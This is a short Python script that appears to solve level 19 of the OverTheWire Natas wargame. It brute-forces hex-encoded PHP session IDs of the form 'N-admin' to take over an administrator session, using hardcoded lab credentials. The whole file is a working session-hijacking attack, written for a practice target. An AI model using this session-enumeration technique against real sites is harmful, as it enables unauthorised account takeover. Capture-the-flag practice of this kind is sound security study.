# -*- coding: utf8 -*-

import time

import requests

def fromHex(hexd):
    codes = [ hexd[i:i+2] for i in range(0,len(hexd),2) ]
    return ''.join([chr(int(code, 16)) for code in codes])

def toHex(txt):
    chars = [ hex(ord(char))[2:] for char in txt ]
    return ''.join(chars)

url = "http://natas19.natas.labs.overthewire.org/index.php"
sessionid = "{0}-admin"
auth = ("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")

for i in range(290, 650):
    if i%10 == 0:
        print("rendus à " + str(i))
    
    cookie = {"PHPSESSID" : toHex(sessionid.format(i))}
	
    r = requests.get(url, auth=auth, cookies=cookie)

    if "logged in as a regular user" not in r.text:
       print(r.text)


print("done with logins")
#for i in rag
